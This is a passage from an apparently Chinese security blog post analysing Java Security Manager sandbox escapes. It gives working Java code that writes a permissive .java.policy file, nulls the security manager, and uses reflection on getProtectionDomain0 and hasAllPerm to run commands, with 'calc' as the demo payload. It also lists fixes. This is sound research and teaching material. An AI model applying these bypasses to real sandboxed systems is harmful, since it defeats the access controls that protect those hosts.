&quot;C:\\Users\\Administrator\\*&quot;, &quot;write&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>BypassSandbox类，利用my.policy策略文件允许在home目录可写的设置，将该目录上写入.java.policy文件，其中的策略内容未授权所有文件具有可执行权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String homePolicyFile = <span class="string">"grant &#123;\n    permission java.io.FilePermission \"&lt;&lt;ALL FILES&gt;&gt;\", \"execute\";\n&#125;;"</span>;</span><br><span class="line">        FileWriter writer = <span class="keyword">new</span> FileWriter(<span class="string">"C:\\Users\\Administrator\\.java.policy"</span>);</span><br><span class="line">        writer.write(homePolicyFile);</span><br><span class="line">        writer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit类，恶意类，执行calc命令弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行Exploit类是不能成功执行的，被Java安全管理器限制了；然后执行BypassSandbox类往home目录上写.java.policy这个默认策略文件，其中内容为允许所有文件具有可执行权限；最后再次运行Exploit类就能成功弹计算器了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; Exploit</span><br><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; Exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/7.png" alt=""></p><h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p><code>-Djava.security.policy==java.policy</code>，用双等于号指定policy文件。</p><h3 id="利用setSecurityManager绕过"><a href="#利用setSecurityManager绕过" class="headerlink" title="利用setSecurityManager绕过"></a>利用setSecurityManager绕过</h3><h4 id="Bypass利用-1"><a href="#Bypass利用-1" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>Java Security Manager不仅能通过参数<code>-Djava.security.policy==java.policy</code>指定，还可以在运行时通过<code>System.setSecurityManager()</code>方法指定。如果被授予setSecurityManager权限，恶意代码可以在运行时调用setSecurityManager()方法，将Java Security Manager置为null即使安全管理器失效，从而实现绕过。</p><p>假设开发者自定义的策略文件my.policy，设置了setSecurityManager权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;setSecurityManager&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>BypassSandbox类，关键在于<code>System.setSecurityManager(null)</code>使得安全管理器失效来实现绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可绕过安全管理器的限制执行命令弹计算器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br></pre></td></tr></table></figure><p><img src="/2020/05/03/浅析Java沙箱逃逸/8.png" alt=""></p><h4 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法"></a>修复方法</h4><p>不授予不可信的代码setSecurityManager权限。</p><h3 id="利用反射绕过"><a href="#利用反射绕过" class="headerlink" title="利用反射绕过"></a>利用反射绕过</h3><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>这里我们调试分析下上面的<code>System.setSecurityManager()</code>这个方法，如下图，该方法实际是调用的setSecurityManager0()方法，其中直接把参数直接赋予了System类中的security变量：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/10.png" alt=""></p><p>看到System类中，它的security属性时用private修饰的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The security manager for the system.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> SecurityManager security = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>也就是说，通过反射调用获取该field时是调用getDeclaredField()函数而不是getField()函数。</p><p>如果被赋予了反射权限，那么是否能通过反射直接把System类中的security变量值置为null，使Java Security manager失效呢？</p><p>我们先来尝试一下直接通过反射设置该security为null看看是否成功。</p><p>假设开发者自定义的策略文件my.policy，授予accessDeclaredMembers权限和suppressAccessChecks权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>BypassSandbox类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setSecurityByReflection()"</span>);</span><br><span class="line">        setSecurityByReflection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setSecurityByReflection</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.System"</span>);</span><br><span class="line">        Field field = clz.getDeclaredField(<span class="string">"security"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(System.class, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可是运行报NoSuchFieldException的错误信息，显示说是不存在security这个字段：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/11.png" alt=""></p><p>明明已经用的是getDeclaredField()函数了，为啥还是报不存在该字段的错误呢？</p><p>为此，调试分析getDeclaredField()函数，看看问题在哪。这里看到该函数中调用了privateGetDeclaredFields()函数：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/12.png" alt=""></p><p>跟进去privateGetDeclaredFields()函数，其中调用Reflection类的filterFields()方法对field进行过滤处理：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/13.png" alt=""></p><p>跟进Reflection.filterFields()方法，在filter过滤的黑名单中System类的security字段就在其中被过滤了：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/14.png" alt=""></p><p>看到Reflection类的静态代码中定义了一个fieldFilterMap，即字段过滤Map，这里已经将System类的security字段添加其中了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    HashMap var0 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    var0.put(Reflection.class, <span class="keyword">new</span> String[]&#123;<span class="string">"fieldFilterMap"</span>, <span class="string">"methodFilterMap"</span>&#125;);</span><br><span class="line">    var0.put(System.class, <span class="keyword">new</span> String[]&#123;<span class="string">"security"</span>&#125;);</span><br><span class="line">    var0.put(Class.class, <span class="keyword">new</span> String[]&#123;<span class="string">"classLoader"</span>&#125;);</span><br><span class="line">    fieldFilterMap = var0;</span><br><span class="line">    methodFilterMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，过滤完成之后返回的是System类其他不在黑名单中的字段，当然不包含security：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/15.png" alt=""></p><p>至此就清楚了确实没办法直接通过反射来设置System类的security字段。</p><p>既然负责检查的检察官Java Security Manager不可修改，那就尝试修改检查的材料—ProtectionDomain。</p><p>根据Java的设计，一个类的URL和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain。如图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/16.png" alt=""></p><p>看到ProtectionDomain类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectionDomain</span> </span>&#123;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// Set up JavaSecurityAccess in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaSecurityAccess(<span class="keyword">new</span> JavaSecurityAccessImpl());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CodeSource */</span></span><br><span class="line">    <span class="keyword">private</span> CodeSource codesource ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ClassLoader the protection domain was consed from */</span></span><br><span class="line">    <span class="keyword">private</span> ClassLoader classloader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Principals running-as within this protection domain */</span></span><br><span class="line">    <span class="keyword">private</span> Principal[] principals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the rights this protection domain is granted */</span></span><br><span class="line">    <span class="keyword">private</span> PermissionCollection permissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if the permissions object has AllPermission */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasAllPerm = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the PermissionCollection is static (pre 1.4 constructor)</span></span><br><span class="line"><span class="comment">       or dynamic (via a policy refresh) */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> staticPermissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br></pre></td></tr></table></figure><p>如前面所说，一个类的CodeSource和Permissions构成了这个类的ProtectionDomain。这里看到hasAllPerm这个字段，应该是一个标记这个类是否有所有权限的布尔变量。因此可以尝试利用反射将它设置为true来看看是否可以使当前类获取所有权限。但是问题在于AccessController会沿着栈自顶向下检查，必须所有栈帧都有权限才能通过。</p><p>这里我们也遍历所有栈帧，将所有栈帧中的所有类的ProtectionDomain中的hasAllPerm置为true。BypassSandbox类的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setHasAllPerm()"</span>);</span><br><span class="line">        setHasAllPerm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                Field field = clz.getProtectionDomain().getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                field.set(clz.getProtectionDomain(), <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可是运行之后还是报错，说是没有getProtectionDomain的权限：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/17.png" alt=""></p><p>这就很尴尬了。我们看下getProtectionDomain()函数的实现，先检查了权限，然后再调用私有的原生方法getProtectionDomain0()来获取ProtectionDomain：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Returns the &#123;<span class="doctag">@code</span> ProtectionDomain&#125; of this class.  If there is a</span></span><br><span class="line"><span class="comment">* security manager installed, this method first calls the security</span></span><br><span class="line"><span class="comment">* manager's &#123;<span class="doctag">@code</span> checkPermission&#125; method with a</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> RuntimePermission("getProtectionDomain")&#125; permission to</span></span><br><span class="line"><span class="comment">* ensure it's ok to get the</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> ProtectionDomain&#125;.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the ProtectionDomain of this class</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> SecurityException</span></span><br><span class="line"><span class="comment">*        if a security manager exists and its</span></span><br><span class="line"><span class="comment">*        &#123;<span class="doctag">@code</span> checkPermission&#125; method doesn't allow</span></span><br><span class="line"><span class="comment">*        getting the ProtectionDomain.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> java.security.ProtectionDomain</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> SecurityManager#checkPermission</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> java.lang.RuntimePermission</span></span><br><span class="line"><span class="comment">* <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> java.security.<span class="function">ProtectionDomain <span class="title">getProtectionDomain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sm.checkPermission(SecurityConstants.GET_PD_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    java.security.ProtectionDomain pd = getProtectionDomain0();</span><br><span class="line">    <span class="keyword">if</span> (pd == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allPermDomain == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.security.Permissions perms =</span><br><span class="line">                <span class="keyword">new</span> java.security.Permissions();</span><br><span class="line">            perms.add(SecurityConstants.ALL_PERMISSION);</span><br><span class="line">            allPermDomain =</span><br><span class="line">                <span class="keyword">new</span> java.security.ProtectionDomain(<span class="keyword">null</span>, perms);</span><br><span class="line">        &#125;</span><br><span class="line">        pd = allPermDomain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们完全可以通过反射直接运行getProtectionDomain0()方法，从而绕过对getProtectionDomain()方法的过滤，进而直接Bypass安全管理器。</p><h4 id="Bypass利用——getProtectionDomain0"><a href="#Bypass利用——getProtectionDomain0" class="headerlink" title="Bypass利用——getProtectionDomain0"></a>Bypass利用——getProtectionDomain0</h4><p>BypassSandbox类的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setHasAllPerm0()"</span>);</span><br><span class="line">        setHasAllPerm0(<span class="string">"calc"</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm0</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="comment">//遍历栈帧</span></span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                <span class="comment">//利用反射调用getProtectionDomain0方法</span></span><br><span class="line">                Method getProtectionDomain = clz.getClass().getDeclaredMethod(<span class="string">"getProtectionDomain0"</span>, <span class="keyword">null</span>);</span><br><span class="line">                getProtectionDomain.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (pd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    Field field = pd.getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    field.set(pd, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可绕过getProtectionDomain()方法的过滤和安全管理器的限制执行命令弹计算器：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/18.png" alt=""></p><h4 id="Bypass利用——ProcessImpl"><a href="#Bypass利用——ProcessImpl" class="headerlink" title="Bypass利用——ProcessImpl"></a>Bypass利用——ProcessImpl</h4><p>有些方法的实现是，在public方法里面调用Security Manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过Security Manager的检查。例如平时我们调用<code>Runtime.getRuntime().exec(command)</code>，其实际的代码实现如下，是调用的ProcessBuilder.start()实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ProcessBuilder(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点进ProcessBuilder.start()函数中看其实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Must convert to array first -- a malicious user-supplied</span></span><br><span class="line">    <span class="comment">// list might try to circumvent the security check.</span></span><br><span class="line">    String[] cmdarray = command.toArray(<span class="keyword">new</span> String[command.size()]);</span><br><span class="line">    cmdarray = cmdarray.clone();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (String arg : cmdarray)</span><br><span class="line">        <span class="keyword">if</span> (arg == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="comment">// Throws IndexOutOfBoundsException if command is empty</span></span><br><span class="line">    String prog = cmdarray[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>)</span><br><span class="line">        security.checkExec(prog);</span><br><span class="line"></span><br><span class="line">    String dir = directory == <span class="keyword">null</span> ? <span class="keyword">null</span> : directory.toString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cmdarray.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmdarray[i].indexOf(<span class="string">'\u0000'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid null character in command"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProcessImpl.start(cmdarray,</span><br><span class="line">                                 environment,</span><br><span class="line">                                 dir,</span><br><span class="line">                                 redirects,</span><br><span class="line">                                 redirectErrorStream);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | IllegalArgumentException e) &#123;</span><br><span class="line">        String exceptionInfo = <span class="string">": "</span> + e.getMessage();</span><br><span class="line">        Throwable cause = e;</span><br><span class="line">        <span class="keyword">if</span> ((e <span class="keyword">instanceof</span> IOException) &amp;&amp; security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Can not disclose the fail reason for read-protected files.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                security.checkRead(prog);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                exceptionInfo = <span class="string">""</span>;</span><br><span class="line">                cause = se;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// It's much easier for us to create a high-quality error</span></span><br><span class="line">        <span class="comment">// message than the low-level C code which found the problem.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(</span><br><span class="line">            <span class="string">"Cannot run 